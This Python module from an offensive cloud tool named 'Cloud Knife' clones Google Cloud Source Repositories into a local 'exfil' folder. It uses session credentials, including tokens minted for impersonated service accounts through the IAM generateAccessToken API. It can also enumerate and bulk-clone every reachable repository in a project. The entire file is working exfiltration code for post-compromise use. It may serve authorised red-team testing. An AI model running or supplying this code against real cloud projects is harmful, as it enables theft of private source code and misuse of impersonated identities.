"""
GCP Source Repositories Exfiltration for Cloud Knife.

Provides functionality to clone Google Cloud Source Repositories using
session credentials (including impersonated service accounts).

Supports authentication via:
- Service Account JSON key file
- Application Default Credentials (ADC)
- Raw access token (via REST API)
"""

import os
import subprocess
from pathlib import Path
from typing import Optional, TYPE_CHECKING

from rich.console import Console
from rich.prompt import Prompt

if TYPE_CHECKING:
    from src.clouds.gcp.gcp_session import GCPSessionManager

console = Console()


def clone_source_repository(
    session_mgr: "GCPSessionManager",
    repo_name: Optional[str] = None,
    project_id: Optional[str] = None,
    output_dir: Optional[str] = None,
) -> Optional[str]:
    """
    Clone a Google Cloud Source Repository using session credentials.

    Args:
        session_mgr: GCP session manager with valid credentials
        repo_name: Name of the repository to clone
        project_id: GCP project ID (defaults to current session project)
        output_dir: Local directory to clone into (default: ./exfil/gcp/source-repos/<repo>)

    Returns:
        Local path where the repository was cloned, or None on failure
    """
    credentials = session_mgr.get_credentials()
    if not credentials:
        console.print("[red]No credentials configured. Use 'set_credentials' first.[/red]")
        return None

    # Determine project
    if not project_id:
        project_id = session_mgr.current_session_data.get("project_id")
        if not project_id:
            project_id = Prompt.ask("[cyan]Project ID[/cyan]")

    if not project_id:
        console.print("[red]Project ID is required.[/red]")
        return None

    # Determine repository name
    if not repo_name:
        repo_name = Prompt.ask("[cyan]Repository name[/cyan]")

    if not repo_name:
        console.print("[red]Repository name is required.[/red]")
        return None

    # Determine output directory
    if not output_dir:
        base_dir = Path("./exfil/gcp/source-repos")
        output_dir = str(base_dir / project_id / repo_name)

    # Create output directory
    output_path = Path(output_dir)
    if output_path.exists():
        console.print(f"[yellow]Directory {output_dir} already exists. Clone may fail if not empty.[/yellow]")

    output_path.parent.mkdir(parents=True, exist_ok=True)

    # Get access token for authentication
    auth_method = session_mgr.current_session_data.get("auth_method")
    access_token = None

    try:
        if auth_method == "service_account":
            from google.auth.transport.requests import Request
            credentials.refresh(Request())
            access_token = credentials.token
        elif auth_method == "adc":
            from google.auth.transport.requests import Request
            if not credentials.valid:
                credentials.refresh(Request())
            access_token = credentials.token
        elif auth_method == "access_token":
            access_token = session_mgr.current_session_data.get("access_token")
        else:
            console.print("[red]Unsupported authentication method.[/red]")
            return None

        if not access_token:
            console.print("[red]Failed to obtain access token.[/red]")
            return None

    except Exception as e:
        console.print(f"[red]Error obtaining access token: {e}[/red]")
        return None

    # Build clone URL for Google Source Repositories
    clone_url = f"https://source.developers.google.com/p/{project_id}/r/{repo_name}"

    # Check if impersonating
    impersonated_sa = session_mgr.current_session_data.get("impersonated_sa")
    if impersonated_sa:
        console.print(f"[dim]Cloning as impersonated SA: {impersonated_sa}[/dim]")

        # If auth_method is access_token, the token is already impersonated
        # (created by the 'impersonate' command), so we don't need to regenerate it
        if auth_method != "access_token":
            # Generate fresh token with full scopes for impersonated SA
            # Only needed when using service_account or adc credentials
            try:
                import requests
                api_url = f"https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/{impersonated_sa}:generateAccessToken"
                headers = {
                    "Authorization": f"Bearer {access_token}",
                    "Content-Type": "application/json",
                }
                body = {
                    "scope": ["https://www.googleapis.com/auth/cloud-platform"],
                    "lifetime": "3600s",
                }

                response = requests.post(api_url, json=body, headers=headers, timeout=30)
                if response.status_code == 200:
                    result = response.json()
                    access_token = result.get("accessToken")
                    if not access_token:
                        console.print("[red]Failed to get impersonated token.[/red]")
                        return None
                else:
                    console.print(f"[red]Failed to generate impersonated token: {response.text}[/red]")
                    return None
            except Exception as e:
                console.print(f"[red]Error generating impersonated token: {e}[/red]")
                return None

    console.print(f"[cyan]Cloning {clone_url} to {output_dir}[/cyan]")

    # Clone using git with credentials
    try:
        # Build authenticated clone URL
        # Format: https://oauth2accesstoken:{TOKEN}@source.developers.google.com/p/{PROJECT}/r/{REPO}
        auth_clone_url = f"https://oauth2accesstoken:{access_token}@source.developers.google.com/p/{project_id}/r/{repo_name}"

        # Execute git clone
        result = subprocess.run(
            ["git", "clone", auth_clone_url, output_dir],
            capture_output=True,
            text=True,
            timeout=300,  # 5 minute timeout
        )

        if result.returncode == 0:
            console.print(f"[green]✓ Repository cloned successfully to {output_dir}[/green]")

            # Remove credentials from git config for security
            try:
                subprocess.run(
                    ["git", "config", "--unset", "credential.helper"],
                    cwd=output_dir,
                    capture_output=True,
                )
                subprocess.run(
                    ["git", "remote", "set-url", "origin", clone_url],
                    cwd=output_dir,
                    capture_output=True,
                )
            except Exception:
                pass  # Not critical if this fails

            return output_dir
        else:
            error_msg = result.stderr or result.stdout
            console.print(f"[red]Git clone failed: {error_msg}[/red]")
            return None

    except subprocess.TimeoutExpired:
        console.print("[red]Clone operation timed out (>5 minutes).[/red]")
        return None
    except FileNotFoundError:
        console.print("[red]Git is not installed or not in PATH.[/red]")
        return None
    except Exception as e:
        console.print(f"[red]Error cloning repository: {e}[/red]")
        return None


def clone_all_source_repositories(
    session_mgr: "GCPSessionManager",
    project_id: Optional[str] = None,
    output_base_dir: Optional[str] = None,
) -> int:
    """
    Clone all accessible Source Repositories from a project.

    Args:
        session_mgr: GCP session manager with valid credentials
        project_id: GCP project ID (defaults to current session project)
        output_base_dir: Base directory for cloning (default: ./exfil/gcp/source-repos/<project>)

    Returns:
        Number of repositories successfully cloned
    """
    from src.clouds.gcp.modules.enumeration import enumerate_source_repositories

    # First enumerate repositories
    console.print("[dim]Enumerating source repositories...[/dim]")
    repos = enumerate_source_repositories(session_mgr)

    if not repos:
        console.print("[yellow]No repositories found to clone.[/yellow]")
        return 0

    # Filter by project if specified
    if project_id:
        repos = [r for r in repos if r.get("project") == project_id]
        if not repos:
            console.print(f"[yellow]No repositories found in project {project_id}.[/yellow]")
            return 0

    console.print(f"[cyan]Found {len(repos)} repositories to clone[/cyan]")

    # Clone each repository
    success_count = 0
    for repo in repos:
        repo_name = repo.get("name")
        repo_project = repo.get("project")

        if not repo_name or not repo_project:
            continue

        # Determine output directory
        if output_base_dir:
            output_dir = str(Path(output_base_dir) / repo_project / repo_name)
        else:
            output_dir = str(Path("./exfil/gcp/source-repos") / repo_project / repo_name)

        # Clone repository
        result = clone_source_repository(
            session_mgr,
            repo_name=repo_name,
            project_id=repo_project,
            output_dir=output_dir,
        )

        if result:
            success_count += 1

    console.print(f"\n[green]✓ Successfully cloned {success_count}/{len(repos)} repositories[/green]")
    return success_count
